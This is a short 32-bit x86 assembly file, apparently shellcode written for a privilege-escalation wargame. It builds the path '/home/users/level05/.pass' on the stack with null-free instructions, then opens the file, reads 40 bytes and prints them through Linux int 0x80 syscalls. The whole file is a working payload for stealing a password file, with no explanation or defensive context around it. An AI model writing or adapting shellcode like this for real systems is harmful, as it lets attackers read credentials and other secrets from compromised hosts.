[bits 32]

[SECTION .text]

global _start
	xor		eax, eax
	xor		ebx, ebx
	;Prepare string
	push	eax		; '\0'
	push	0x73736170	; 'pass'
	push	0x2e2f3530	; '05/.'
	push	0x6c657665	; 'evel'
	push	0x6c2f7372	; 'rs/l'
	push	0x6573752f	; '/use'
	push	0x656d6f68	; 'home'
	push	0x2f2f2f2f	; '////'
	; Open file in read only
	mov	ebx, esp	; ebx = filename
	xor	ecx, ecx	; Read only
	xor	edx, edx	; mode 0
	mov	al, 5		; syscall open
	int	0x80		; call kernel
	mov	ebx, eax	; ebx => fd
	; Read file
	sub	esp, 40		; move stack for buffer
	lea	ecx, [esp]	; argument buffer
	mov	dl, 40		; argument size
	mov	al, 3		; syscall read
	int	0x80		; call kernel
	; Write
	mov	bl, 1		; argument fd
	mov	al, 4		; syscall write
	int	0x80		; call kernel

